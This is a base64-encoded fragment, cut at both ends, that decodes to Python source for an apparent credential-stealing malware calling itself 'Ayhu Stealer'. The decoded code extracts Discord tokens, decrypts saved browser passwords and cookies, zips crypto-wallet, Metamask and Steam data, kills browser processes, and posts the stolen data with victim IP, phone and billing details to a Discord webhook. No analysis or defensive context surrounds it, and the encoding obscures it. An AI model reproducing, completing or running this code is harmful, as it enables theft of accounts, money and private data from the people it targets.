gICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjptb2JpbGVfcGhvbmU6IFBob25lOiIsDQogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie3Bob25lfSIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpnbG9iZV93aXRoX21lcmlkaWFuczogSVA6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJge2dldGlwKCl9YCIsDQogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjpiZWdpbm5lcjogQmFkZ2VzOiIsDQogICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYie25pdHJvfXtiYWRnZX0iLA0KICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICI6Y3JlZGl0X2NhcmQ6IEJpbGxpbmc6IiwNCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7YmlsbGluZ30iLA0KICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzZXJuYW1lfSN7aGFzaHRhZ30gKHtpZGR9KSIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogZiJ7cGZwfSINCiAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgImZvb3RlciI6IHsNCiAgICAgICAgICAgICAgICAidGV4dCI6ICJAQXlodSBTdGVhbGVyIiwNCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIg0KICAgICAgICAgICAgICAgIH0sDQogICAgICAgICAgICAidGh1bWJuYWlsIjogew0KICAgICAgICAgICAgICAgICJ1cmwiOiBmIntwZnB9Ig0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIiwNCiAgICAgICAgInVzZXJuYW1lIjogIkF5aHUgU3RlYWxlciIsDQogICAgICAgICJhdHRhY2htZW50cyI6IFtdDQogICAgICAgIH0NCiAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpDQoNCmRlZiBSZWZvcm1hdChsaXN0dCk6DQogICAgZSA9IHJlLmZpbmRhbGwoIihcdytbYS16XSkiLGxpc3R0KQ0KICAgIHdoaWxlICJodHRwcyIgaW4gZTogZS5yZW1vdmUoImh0dHBzIikNCiAgICB3aGlsZSAiY29tIiBpbiBlOiBlLnJlbW92ZSgiY29tIikNCiAgICB3aGlsZSAibmV0IiBpbiBlOiBlLnJlbW92ZSgibmV0IikNCiAgICByZXR1cm4gbGlzdChzZXQoZSkpDQoNCmRlZiB1cGxvYWQobmFtZSwgdGs9JycpOg0KICAgIGhlYWRlcnMgPSB7DQogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIg0KICAgIH0NCg0KICAgIGlmIG5hbWUgPT0gImtpd2kiOg0KICAgICAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6ICcnLA0KICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOiIsDQogICAgICAgICAgICAgICAgInZhbHVlIjogdGsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJBeWh1IHwgRmlsZSBTdGVhbGVyIg0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJmb290ZXIiOiB7DQogICAgICAgICAgICAgICAgInRleHQiOiAiQEF5aHUgU3RlYWxlciIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3MDAwMzc4NTU1ODY4MzY5OC8xMDMxMTQ3OTE3Njg1MzA5NDkwL3NhLmpwZyINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIiwNCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgfQ0KICAgICAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQ0KICAgICAgICByZXR1cm4NCg0KICAgIHBhdGggPSBuYW1lDQogICAgZmlsZXMgPSB7J2ZpbGUnOiBvcGVuKHBhdGgsICdyYicpfQ0KICAgICMgcHJpbnQoZiJGSUxFPSB7ZmlsZXN9IikNCg0KICAgIGlmICJ3cHBhc3N3IiBpbiBuYW1lOg0KDQogICAgICAgIHJhID0gJyB8ICcuam9pbihkYSBmb3IgZGEgaW4gcGFzd1dvcmRzKQ0KDQogICAgICAgIGlmIGxlbihyYSkgPiAxMDAwOg0KICAgICAgICAgICAgcnJyID0gUmVmb3JtYXQoc3RyKHBhc3dXb3JkcykpDQogICAgICAgICAgICByYSA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycikNCg0KICAgICAgICBkYXRhID0gew0KICAgICAgICAiY29udGVudCI6ICcnLA0KICAgICAgICAiZW1iZWRzIjogWw0KICAgICAgICAgICAgew0KICAgICAgICAgICAgImNvbG9yIjogMTQ0MDY0MTMsDQogICAgICAgICAgICAiZmllbGRzIjogWw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJGb3VuZDoiLA0KICAgICAgICAgICAgICAgICJ2YWx1ZSI6IHJhDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgXSwNCiAgICAgICAgICAgICJhdXRob3IiOiB7DQogICAgICAgICAgICAgICAgIm5hbWUiOiAiQXlodSB8IFBhc3N3b3JkIFN0ZWFsZXIiDQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgImZvb3RlciI6IHsNCiAgICAgICAgICAgICAgICAidGV4dCI6ICJAQXlodSBTdGVhbGVyIiwNCiAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIg0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICBdLA0KICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy85NzAwMDM3ODU1NTg2ODM2OTgvMTAzMTE0NzkxNzY4NTMwOTQ5MC9zYS5qcGciLA0KICAgICAgICAiYXR0YWNobWVudHMiOiBbXQ0KICAgICAgICB9DQogICAgICAgICMgdXJsb3BlbihSZXF1ZXN0KGhvb2ssIGRhdGE9ZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykpDQogICAgICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpDQoNCiAgICBpZiAid3Bjb29rIiBpbiBuYW1lOg0KICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIGNvb2tpV29yZHMpDQogICAgICAgIGlmIGxlbihyYikgPiAxMDAwOg0KICAgICAgICAgICAgcnJycnIgPSBSZWZvcm1hdChzdHIoY29va2lXb3JkcykpDQogICAgICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycnJyKQ0KDQogICAgICAgIGRhdGEgPSB7DQogICAgICAgICJjb250ZW50IjogJycsDQogICAgICAgICJlbWJlZHMiOiBbDQogICAgICAgICAgICB7DQogICAgICAgICAgICAiY29sb3IiOiAxNDQwNjQxMywNCiAgICAgICAgICAgICJmaWVsZHMiOiBbDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICJuYW1lIjogIkZvdW5kOiIsDQogICAgICAgICAgICAgICAgInZhbHVlIjogcmINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICBdLA0KICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAibmFtZSI6ICJBeWh1IHwgQ29va2llcyBTdGVhbGVyIg0KICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICJmb290ZXIiOiB7DQogICAgICAgICAgICAgICAgInRleHQiOiAiQEF5aHUgU3RlYWxlciIsDQogICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzk3MDAwMzc4NTU1ODY4MzY5OC8xMDMxMTQ3OTE3Njg1MzA5NDkwL3NhLmpwZyINCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgXSwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTcwMDAzNzg1NTU4NjgzNjk4LzEwMzExNDc5MTc2ODUzMDk0OTAvc2EuanBnIiwNCiAgICAgICAgImF0dGFjaG1lbnRzIjogW10NCiAgICAgICAgfQ0KICAgICAgICAjIHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpKQ0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQ0KDQogICAgIyByID0gcmVxdWVzdHMucG9zdChob29rLCBmaWxlcz1maWxlcykNCiAgICBMb2FkUmVxdWVzdHMoIlBPU1QiLCBob29rLCBmaWxlcz1maWxlcykNCg0KZGVmIHdyaXRlZm9yZmlsZShkYXRhLCBuYW1lKToNCiAgICBwYXRoID0gb3MuZ2V0ZW52KCJURU1QIikgKyBmIlx3cHtuYW1lfS50eHQiDQogICAgd2l0aCBvcGVuKHBhdGgsIG1vZGU9J3cnLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOg0KICAgICAgICBmLndyaXRlKGYiPC0tQVlIVSBTVEVBTEVSIEJFU1QgLS0+XG5cbiIpDQogICAgICAgIGZvciBsaW5lIGluIGRhdGE6DQogICAgICAgICAgICBpZiBsaW5lWzBdICE9ICcnOg0KICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7bGluZX1cbiIpDQoNClRva2VucyA9ICcnDQpkZWYgZ2V0VG9rZW4ocGF0aCwgYXJnKToNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybg0KDQogICAgcGF0aCArPSBhcmcNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGgpOg0KICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOg0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGh9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06DQogICAgICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChyIltcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI1LDExMH0iLCByIm1mYVwuW1x3LV17ODAsOTV9Iik6DQogICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoZWNrVG9rZW4odG9rZW4pOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b2tlbiBpbiBUb2tlbnM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRva2VucyArPSB0b2tlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGxvYWRUb2tlbih0b2tlbiwgcGF0aCkNCg0KUGFzc3cgPSBbXQ0KZGVmIGdldFBhc3N3KHBhdGgsIGFyZyk6DQogICAgZ2xvYmFsIFBhc3N3DQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4NCg0KICAgIHBhdGhDID0gcGF0aCArIGFyZyArICIvTG9naW4gRGF0YSINCiAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybg0KDQogICAgdGVtcGZvbGQgPSB0ZW1wICsgIndwIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiDQoNCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQ0KICAgIGNvbm4gPSBzcWxfY29ubmVjdCh0ZW1wZm9sZCkNCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpDQogICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBhY3Rpb25fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM7IikNCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkNCiAgICBjdXJzb3IuY2xvc2UoKQ0KICAgIGNvbm4uY2xvc2UoKQ0KICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkNCg0KICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCiAgICB3aXRoIG9wZW4ocGF0aEtleSwgJ3InLCBlbmNvZGluZz0ndXRmLTgnKSBhcyBmOiBsb2NhbF9zdGF0ZSA9IGpzb25fbG9hZHMoZi5yZWFkKCkpDQogICAgbWFzdGVyX2tleSA9IGI2NGRlY29kZShsb2NhbF9zdGF0ZVsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddKQ0KICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pDQoNCiAgICBmb3Igcm93IGluIGRhdGE6DQogICAgICAgIGlmIHJvd1swXSAhPSAnJzoNCiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOg0KICAgICAgICAgICAgICAgIG9sZCA9IHdhDQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToNCiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2ENCiAgICAgICAgICAgICAgICAgICAgd2EgPSB0bXAuc3BsaXQoJ1snKVsxXS5zcGxpdCgnXScpWzBdDQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOg0KICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIHBhc3dXb3JkczogcGFzd1dvcmRzLmFwcGVuZChvbGQpDQogICAgICAgICAgICBQYXNzdy5hcHBlbmQoZiJVUjE6IHtyb3dbMF19IHwgVTUzUk40TTM6IHtyb3dbMV19IHwgUDQ1NVcwUkQ6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQ0KICAgICAgICAjIHByaW50KFtyb3dbMF0sIHJvd1sxXSwgRGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSldKQ0KICAgIHdyaXRlZm9yZmlsZShQYXNzdywgJ3Bhc3N3JykNCg0KQ29va2llcyA9IFtdDQpkZWYgZ2V0Q29va2llKHBhdGgsIGFyZyk6DQogICAgZ2xvYmFsIENvb2tpZXMNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybg0KDQogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIg0KICAgIGlmIG9zLnN0YXQocGF0aEMpLnN0X3NpemUgPT0gMDogcmV0dXJuDQoNCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAid3AiICsgJycuam9pbihyYW5kb20uY2hvaWNlKCdiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JykgZm9yIGkgaW4gcmFuZ2UoOCkpICsgIi5kYiINCg0KICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpDQogICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQ0KICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkNCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGhvc3Rfa2V5LCBuYW1lLCBlbmNyeXB0ZWRfdmFsdWUgRlJPTSBjb29raWVzIikNCiAgICBkYXRhID0gY3Vyc29yLmZldGNoYWxsKCkNCiAgICBjdXJzb3IuY2xvc2UoKQ0KICAgIGNvbm4uY2xvc2UoKQ0KICAgIG9zLnJlbW92ZSh0ZW1wZm9sZCkNCg0KICAgIHBhdGhLZXkgPSBwYXRoICsgIi9Mb2NhbCBTdGF0ZSINCg0KICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkNCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pDQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkNCg0KICAgIGZvciByb3cgaW4gZGF0YToNCiAgICAgICAgaWYgcm93WzBdICE9ICcnOg0KICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6DQogICAgICAgICAgICAgICAgb2xkID0gd2ENCiAgICAgICAgICAgICAgICBpZiAiaHR0cHMiIGluIHdhOg0KICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQ0KICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0NCiAgICAgICAgICAgICAgICBpZiB3YSBpbiByb3dbMF06DQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gY29va2lXb3JkczogY29va2lXb3Jkcy5hcHBlbmQob2xkKQ0KICAgICAgICAgICAgQ29va2llcy5hcHBlbmQoZiJIMDU3IEszWToge3Jvd1swXX0gfCBONE0zOiB7cm93WzFdfSB8IFY0MVUzOiB7RGVjcnlwdFZhbHVlKHJvd1syXSwgbWFzdGVyX2tleSl9IikNCiAgICAgICAgIyBwcmludChbcm93WzBdLCByb3dbMV0sIERlY3J5cHRWYWx1ZShyb3dbMl0sIG1hc3Rlcl9rZXkpXSkNCiAgICB3cml0ZWZvcmZpbGUoQ29va2llcywgJ2Nvb2snKQ0KDQpkZWYgR2V0RGlzY29yZChwYXRoLCBhcmcpOg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmIntwYXRofS9Mb2NhbCBTdGF0ZSIpOiByZXR1cm4NCg0KICAgIHBhdGhDID0gcGF0aCArIGFyZw0KDQogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIg0KICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0ganNvbl9sb2FkcyhmLnJlYWQoKSkNCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pDQogICAgbWFzdGVyX2tleSA9IENyeXB0VW5wcm90ZWN0RGF0YShtYXN0ZXJfa2V5WzU6XSkNCiAgICAjIHByaW50KHBhdGgsIG1hc3Rlcl9rZXkpDQoNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToNCiAgICAgICAgIyBwcmludChwYXRoLCBmaWxlKQ0KICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOg0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGhDfVxce2ZpbGV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOg0KICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHIiZFF3NHc5V2dYY1E6W14uKlxbJyguKiknXF0uKiRdW15cIl0qIiwgbGluZSk6DQogICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUb2tlbnMNCiAgICAgICAgICAgICAgICAgICAgdG9rZW5EZWNvZGVkID0gRGVjcnlwdFZhbHVlKGI2NGRlY29kZSh0b2tlbi5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLCBtYXN0ZXJfa2V5KQ0KICAgICAgICAgICAgICAgICAgICBpZiBjaGVja1Rva2VuKHRva2VuRGVjb2RlZCk6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdG9rZW5EZWNvZGVkIGluIFRva2VuczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHByaW50KHRva2VuKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRva2VucyArPSB0b2tlbkRlY29kZWQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHdyaXRlZm9yZmlsZShUb2tlbnMsICd0b2tlbnMnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVwbG9hZFRva2VuKHRva2VuRGVjb2RlZCwgcGF0aCkNCg0KDQpkZWYgWmlwVGhpbmdzKHBhdGgsIGFyZywgcHJvY2MpOg0KICAgIHBhdGhDID0gcGF0aA0KICAgIG5hbWUgPSBhcmcNCiAgICAjIHN1YnByb2Nlc3MuUG9wZW4oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIsIHNoZWxsPVRydWUpDQogICAgIyBvcy5zeXN0ZW0oZiJ0YXNra2lsbCAvaW0ge3Byb2NjfSAvdCAvZiIpDQoNCiAgICBpZiAibmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iIGluIGFyZzoNCiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpDQogICAgICAgIG5hbWUgPSBmIk1ldGFtYXNrX3ticm93c2VyfSINCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnDQoNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aEMpOiByZXR1cm4NCiAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQ0KDQogICAgaWYgIldhbGxldCIgaW4gYXJnIG9yICJOYXRpb25zR2xvcnkiIGluIGFyZzoNCiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpDQogICAgICAgIG5hbWUgPSBmInticm93c2VyfSINCg0KICAgIGVsaWYgIlN0ZWFtIiBpbiBhcmc6DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiKTogcmV0dXJuDQogICAgICAgIGYgPSBvcGVuKGYie3BhdGhDfS9sb2dpbnVzZXJzLnZkZiIsICJyKyIsIGVuY29kaW5nPSJ1dGY4IikNCiAgICAgICAgZGF0YSA9IGYucmVhZGxpbmVzKCkNCiAgICAgICAgIyBwcmludChkYXRhKQ0KICAgICAgICBmb3VuZCA9IEZhbHNlDQogICAgICAgIGZvciBsIGluIGRhdGE6DQogICAgICAgICAgICBpZiAnUmVtZW1iZXJQYXNzd29yZCJcdFx0IjEiJyBpbiBsOg0KICAgICAgICAgICAgICAgIGZvdW5kID0gVHJ1ZQ0KICAgICAgICBpZiBmb3VuZCA9PSBGYWxzZTogcmV0dXJuDQogICAgICAgIG5hbWUgPSBhcmcNCg0KICAgIHpmID0gWmlwRmlsZShmIntwYXRoQ30ve25hbWV9LnppcCIsICJ3IikNCiAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGhDKToNCiAgICAgICAgaWYgbm90ICIuemlwIiBpbiBmaWxlOiB6Zi53cml0ZShwYXRoQyArICIvIiArIGZpbGUpDQogICAgemYuY2xvc2UoKQ0KDQogICAgdXBsb2FkKGYne3BhdGhDfS97bmFtZX0uemlwJykNCiAgICBvcy5yZW1vdmUoZiJ7cGF0aEN9L3tuYW1lfS56aXAiKQ0KDQoNCmRlZiBHYXRoZXJBbGwoKToNCiAgICAnICAgICAgICAgICAgICAgICAgIERlZmF1bHQgUGF0aCA8IDAgPiAgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZXNOYW1lIDwgMSA+ICAgICAgICBUb2tlbiAgPCAyID4gICAgICAgICAgICAgIFBhc3N3b3JkIDwgMyA+ICAgICBDb29raWVzIDwgNCA+ICAgICAgICAgICAgICAgICAgICAgICAgICBFeHRlbnRpb25zIDwgNSA+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcNCiAgICBicm93c2VyUGF0aHMgPSBbDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBHWCBTdGFibGUiLCAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBTdGFibGUiLCAgICAgICAgICAgICAgICAgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntyb2FtaW5nfS9PcGVyYSBTb2Z0d2FyZS9PcGVyYSBOZW9uL1VzZXIgRGF0YS9EZWZhdWx0IiwgICJvcGVyYS5leGUiLCAgICAiL0xvY2FsIFN0b3JhZ2UvbGV2ZWxkYiIsICAgICAgICAgICAiLyIsICAgICAgICAgICAgIi9OZXR3b3JrIiwgICAgICAgICAgICAgIi9Mb2NhbCBFeHRlbnNpb24gU2V0dGluZ3MvbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm4iICAgICAgICAgICAgICAgICAgICAgIF0sDQogICAgICAgIFtmIntsb2NhbH0vVG